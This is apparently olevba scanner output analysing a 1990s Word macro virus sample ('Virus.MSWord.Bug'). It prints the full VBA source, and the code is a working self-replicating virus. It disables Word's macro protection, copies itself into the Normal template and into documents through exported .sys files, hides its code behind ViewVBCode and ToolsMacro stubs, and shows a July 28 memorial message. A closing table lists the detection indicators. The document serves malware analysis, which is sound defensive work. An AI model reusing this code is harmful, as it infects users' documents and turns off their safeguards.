olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Santro4/12/99 4:40:47 PMWoobie.doc
S.UserForm_Click
'Santro4/12/99 4:40:47 PMWoobie.doc
If Day(Now) = 28 And Month(Now) = 7 Then S.Show
'Santro4/12/99 4:40:47 PMWoobie.doc
End Sub
'Santro4/12/99 4:40:47 PMWoobie.doc
Sub ViewVBCode()
'Santro4/12/99 4:40:47 PMWoobie.doc
End Sub
'Santro4/12/99 4:40:47 PMWoobie.doc
Sub ToolsMacro()
'Santro4/12/99 4:40:47 PMWoobie.doc
End Sub
-------------------------------------------------------------------------------
VBA MACRO S.frm 
in file: Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7 - OLE stream: 'Macros/VBA/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Santro4/12/99 4:40:47 PMWoobie.doc
Sub UserForm_Click()
'Santro4/12/99 4:40:47 PMWoobie.doc
On Error GoTo out
'Santro4/12/99 4:40:47 PMWoobie.doc
Options.VirusProtection = False
'Santro4/12/99 4:40:47 PMWoobie.doc
Options.SaveNormalPrompt = False
'Santro4/12/99 4:40:47 PMWoobie.doc
Options.ConfirmConversions = False
'Santro4/12/99 4:40:47 PMWoobie.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'Santro4/12/99 4:40:47 PMWoobie.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'Santro4/12/99 4:40:47 PMWoobie.doc
If nt > 0 And ad > 0 Then GoTo out
'Santro4/12/99 4:40:47 PMWoobie.doc
If nt = 0 Then
'Santro4/12/99 4:40:47 PMWoobie.doc
    Set infect = NormalTemplate.VBProject.VBComponents
'Santro4/12/99 4:40:47 PMWoobie.doc
    Set host = ActiveDocument.VBProject.VBComponents
'Santro4/12/99 4:40:47 PMWoobie.doc
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'Santro4/12/99 4:40:47 PMWoobie.doc
    host.Item(1).codemodule.replaceline 5, "If Day(Now) = 28 And Month(Now) = 7 Then " & Application.UserInitials & ".show"
'Santro4/12/99 4:40:47 PMWoobie.doc
    host.Item(1).Name = infect.Item(1).Name
'Santro4/12/99 4:40:47 PMWoobie.doc
    host.Item(2).Name = Application.UserInitials
'Santro4/12/99 4:40:47 PMWoobie.doc
    host.Item(1).Export "c:\one.sys"
'Santro4/12/99 4:40:47 PMWoobie.doc
    host.Item(2).Export "c:\two.sys"
'Santro4/12/99 4:40:47 PMWoobie.doc
End If
'Santro4/12/99 4:40:47 PMWoobie.doc
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'Santro4/12/99 4:40:47 PMWoobie.doc
infect.Import ("c:\two.sys")
'Santro4/12/99 4:40:47 PMWoobie.doc
infect.Item(1).codemodule.AddFromFile ("c:\one.sys")
'Santro4/12/99 4:40:47 PMWoobie.doc
With infect.Item(1).codemodule
'Santro4/12/99 4:40:47 PMWoobie.doc
    For x = 1 To 4
'Santro4/12/99 4:40:47 PMWoobie.doc
    .deletelines 1
'Santro4/12/99 4:40:47 PMWoobie.doc
    Next x
'Santro4/12/99 4:40:47 PMWoobie.doc
    If nt = 0 Then
'Santro4/12/99 4:40:47 PMWoobie.doc
    .insertlines 9, vbCr & "Sub ViewVBCode()"
'Santro4/12/99 4:40:47 PMWoobie.doc
    .insertlines 11, vbCr & "End Sub"
'Santro4/12/99 4:40:47 PMWoobie.doc
    .insertlines 13, vbCr & "Sub ToolsMacro()"
'Santro4/12/99 4:40:47 PMWoobie.doc
    .insertlines 15, vbCr & "End Sub"
'Santro4/12/99 4:40:47 PMWoobie.doc
    End If
'Santro4/12/99 4:40:47 PMWoobie.doc
End With
'Santro4/12/99 4:40:47 PMWoobie.doc
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'Santro4/12/99 4:40:47 PMWoobie.doc
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Santro4/12/99 4:40:47 PMWoobie.doc
With infect.Item(2).codemodule
'Santro4/12/99 4:40:47 PMWoobie.doc
    .deletelines 1
'Santro4/12/99 4:40:47 PMWoobie.doc
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'Santro4/12/99 4:40:47 PMWoobie.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Santro4/12/99 4:40:47 PMWoobie.doc
    Next x
'Santro4/12/99 4:40:47 PMWoobie.doc
End With
'Santro4/12/99 4:40:47 PMWoobie.doc
With infect.Item(1).codemodule
'Santro4/12/99 4:40:47 PMWoobie.doc
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'Santro4/12/99 4:40:47 PMWoobie.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Santro4/12/99 4:40:47 PMWoobie.doc
    Next x
'Santro4/12/99 4:40:47 PMWoobie.doc
End With
'Santro4/12/99 4:40:47 PMWoobie.doc
out:
'Santro4/12/99 4:40:47 PMWoobie.doc
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Santro4/12/99 4:40:47 PMWoobie.doc
End Sub
'Santro4/12/99 4:40:47 PMWoobie.doc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WOOBIE@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"Das Woo"^F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-^F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R.I.P. July 28, 1998�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�We Love YOu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-^F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1992-1998^F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be Missed, �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label17'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label19'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label20'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label21'" IN 'Virus.MSWord.Bug-ddcaa7cca53451f36c571a1d89fb499695c883b7' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

